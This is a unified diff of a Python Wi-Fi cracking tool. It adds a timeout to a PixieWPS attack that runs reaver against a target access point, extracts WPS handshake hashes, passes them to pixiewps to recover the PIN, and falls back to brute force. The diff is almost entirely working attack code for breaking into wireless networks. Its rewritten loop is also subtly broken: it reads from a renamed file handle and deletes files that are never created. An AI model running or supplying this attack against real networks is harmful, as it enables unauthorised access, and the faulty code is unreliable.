@@ -155,6 +155,7 @@ CRACKED_TARGETS    = []    # List of targets we have already cracked
 ATTACK_ALL_TARGETS = False # Flag for when we want to attack *everyone*
 ATTACK_MIN_POWER   = 0     # Minimum power (dB) for access point to be considered a target
 VERBOSE_APS        = True  # Print access points as they appear
+PIXIE_TIMEOUT	   = 60
 
 # Console colors
 W  = '\033[0m'  # white (normal)
@@ -441,7 +442,7 @@ def handle_args():
 	global WEP_CAFFELATTE, WEP_P0841, WEP_HIRTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
 	global WEP_SAVE, SHOW_MAC_IN_SCAN, ATTACK_ALL_TARGETS, ATTACK_MIN_POWER
 	global WPS_DISABLE, WPS_TIMEOUT, WPS_RATIO_THRESHOLD, WPS_MAX_RETRIES
-	global VERBOSE_APS
+	global VERBOSE_APS, PIXIE_TIMEOUT
 
 	args = argv[1:]
 	if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
@@ -2841,6 +2842,12 @@ def wps_attack(iface, target):
 	print GR+' [0:00:00]'+W+' initializing %sPixieWPS attack%s on %s' % \
 	             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
 
+
+	p_start = int(time.time())
+	pixie="false"
+	pixie_exit="false"
+	p_run = (p_start + PIXIE_TIMEOUT)
+
 	WPSpin=""
 	ENonce=""
 	PKE=""
@@ -2856,89 +2863,101 @@ def wps_attack(iface, target):
 	AuthKeyb=""
 	ENonceb=""
 
-
-	fin = open(temp + "fReaverIn.txt", "w")
-	fout = open(temp + "fReaverOut.txt", "w")
-	ferr = open(temp + "fReaverErrors.txt", "w")
+	p_out = open(temp + "reaver_out.out", "w")
 	
-	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L" ], stdin=fin, stdout=fout, stderr=ferr).pid
+	#Run reaver to collect hashes
 
-	f = open(temp + "fReaverOut.txt")
-	 
-	done="false"
-	while done == "false":
-		line = f.readline()
-		if "E-Nonce:" in line and ENonceb == "":                                                                                                     
-			print GR+' [+]'+G+' E-Nonce found'                                                                                         
-			ENonceb="1"                                      
-		if "PKE:" in line and PKEb == "":
-			print GR+' [+]'+G+' PKE hash found'
-			PKEb="1"
-                if "PKR:" in line and PKRb == "":                 
-                        print GR+' [+]'+G+' PKR hash found'     
-                        PKRb="1"                                
-		if "AuthKey:" in line and AuthKeyb == "":
-			print GR+' [+]'+G+' Authkey found'
+	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a" ], stdout=p_out).pid
+
+	p = open(temp + "reaver_out.out")
+
+	#Report when each hash is found
+
+	while pixie_exit == "false":
+		while pixie == "false":
+			time.sleep(1)
+			line = p.readline()
+			if "E-Nonce:" in line and ENonceb == "":                                                                                                     
+				print GR+' [+]'+G+' E-Nonce found'                                                                                         
+				ENonceb="1"                                      
+			if "PKE:" in line and PKEb == "":
+				print GR+' [+]'+G+' PKE hash found'
+				PKEb="1"
+       		        if "PKR:" in line and PKRb == "":                 
+       	        	        print GR+' [+]'+G+' PKR hash found'     
+        	                PKRb="1"                                
+			if "AuthKey:" in line and AuthKeyb == "":
+				print GR+' [+]'+G+' Authkey found'
 			AuthKeyb="1"
-		if "E-Hash1" in line and EHash1b == "":
-			print GR+' [+]'+G+' E-Hash1 found'
-			EHash1b="1"
-		if "E-Hash2" in line:
-			os.kill(pid, signal.SIGQUIT)
-			print GR+' [+]'+G+' E-Hash2 found'
-			done = "true"
+			if "E-Hash1" in line and EHash1b == "":
+				print GR+' [+]'+G+' E-Hash1 found'
+				EHash1b="1"
+			if "E-Hash2" in line:
+				os.kill(pid, signal.SIGQUIT)
+				print GR+' [+]'+G+' E-Hash2 found'
+				pixie = "true"
+			if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
+				print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (PIXIE_TIMEOUT)
+				print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
+				WPSpin="WPS pin not found!"
+				pixie_exit="True"
+				break
+
+		if pixie == "true":
 	
-	line="s"
-	f.seek(0)
-	while line:
+			line="s"
+			p.seek(0)
+			while line:
 	    
-	    line = f.readline()
-	    if "PKE:" in line:PKE=line
-	    if "PKR:" in line:PKR=line
-	    if "E-Hash1" in line:EHash1=line
-	    if "E-Hash2" in line:EHash2=line
-	    if "AuthKey" in line:AuthKey=line
-	    if "E-Nonce" in line:ENonce=line
-	f.close()
+			    line = f.readline()
+			    if "PKE:" in line:PKE=line
+			    if "PKR:" in line:PKR=line
+			    if "E-Hash1" in line:EHash1=line
+			    if "E-Hash2" in line:EHash2=line
+			    if "AuthKey" in line:AuthKey=line
+			    if "E-Nonce" in line:ENonce=line
+			p.close()
+		
+			os.remove(temp + "reaver_err.out")
+			os.remove(temp + "reaver_in.out")
+			os.remove(temp + "reaver_out.out")
+		
+			ENonce=ENonce[ENonce.find("E-Nonce:")+5:ENonce.find("\n")] 	
+			PKE=PKE[PKE.find("PKE:")+5:PKE.find("\n")]
+			PKR=PKR[PKR.find("PKR:")+5:PKR.find("\n")]	
+			EHash1=EHash1[EHash1.find("EHash1:")+14:EHash1.find("\n")]
+			EHash2=EHash2[EHash2.find("EHash2:")+14:EHash2.find("\n")]
+			AuthKey=AuthKey[AuthKey.find("AuthKey:")+9:AuthKey.find("\n")]
+			
+			
+			PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2
+			EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2
+			EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2
+			AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2
 	
-	os.remove(temp + "fReaverErrors.txt")
-	os.remove(temp + "fReaverIn.txt")
-	os.remove(temp + "fReaverOut.txt")
+			fin2 = open(temp + "fPixiewpsIn.txt", "w")
+			fout2 = open(temp + "fPixiewpsOut.txt", "w")
+			ferr2 = open(temp + "fPixiewpsErrors.txt", "w")
 	
-	ENonce=ENonce[ENonce.find("E-Nonce:")+5:ENonce.find("\n")] 	
-	PKE=PKE[PKE.find("PKE:")+5:PKE.find("\n")]
-        PKR=PKR[PKR.find("PKR:")+5:PKR.find("\n")]	
-	EHash1=EHash1[EHash1.find("EHash1:")+14:EHash1.find("\n")]
-	EHash2=EHash2[EHash2.find("EHash2:")+14:EHash2.find("\n")]
-	AuthKey=AuthKey[AuthKey.find("AuthKey:")+9:AuthKey.find("\n")]
+			#Stuff the hashes into pixiewps	
+
+
+			runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", ENonce ],stdin=fin2, stdout=fout2, stderr=ferr2)
+			Popen.wait(runpixie)
+			f = open(temp + 'fPixiewpsOut.txt')
+			line="s"
+			while line:
+				line = f.readline()
+				if "WPS pin:" in line:WPSpin=line
+				if "WPS pin not found!" in line:WPSpin="WPS pin not found!"
+			f.close()
+			
+			os.remove(temp + "fPixiewpsErrors.txt")
+			os.remove(temp + "fPixiewpsIn.txt")
+			os.remove(temp + "fPixiewpsOut.txt")	
 	
-	
-	PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2
-	EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2
-	EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2
-	AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2
-	
-	fin2 = open(temp + "fPixiewpsIn.txt", "w")
-	fout2 = open(temp + "fPixiewpsOut.txt", "w")
-	ferr2 = open(temp + "fPixiewpsErrors.txt", "w")
-	
-	
-	runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", ENonce ],stdin=fin2, stdout=fout2, stderr=ferr2)
-	Popen.wait(runpixie)
-	f = open(temp + 'fPixiewpsOut.txt')
-	line="s"
-	while line:
-		line = f.readline()
-		if "WPS pin:" in line:WPSpin=line
-		if "WPS pin not found!" in line:WPSpin="WPS pin not found!"
-	f.close()
-	
-	os.remove(temp + "fPixiewpsErrors.txt")
-	os.remove(temp + "fPixiewpsIn.txt")
-	os.remove(temp + "fPixiewpsOut.txt")
-	
-	if WPSpin=="WPS pin not found!":
-		print GR+'\n [+]'+G+' PIN not found'
+	if WPSpin=="WPS pin not found!":	#Crap, timed out or didn't work. Run a regular reaver brute-force
+		print GR+'\n [+]'+G+' Pixiewps attack failed!'
 		cmd = ['reaver',
 			'-i', iface,
 		       	'-b', target.bssid,
@@ -2949,9 +2968,8 @@ def wps_attack(iface, target):
 
 
 	else:
-		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
+		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]	#pixiewps found a pin, let's see if it works! Have to remove the -a flag, or it hangs. 
 		print GR+'\n [+]'+G+' PIN found:     %s' % (C+WPSpin+W)
-
 		print GR+' [+]'+G+' Handing pin to reaver'
 		cmd = ['reaver',
 			'-i', iface,
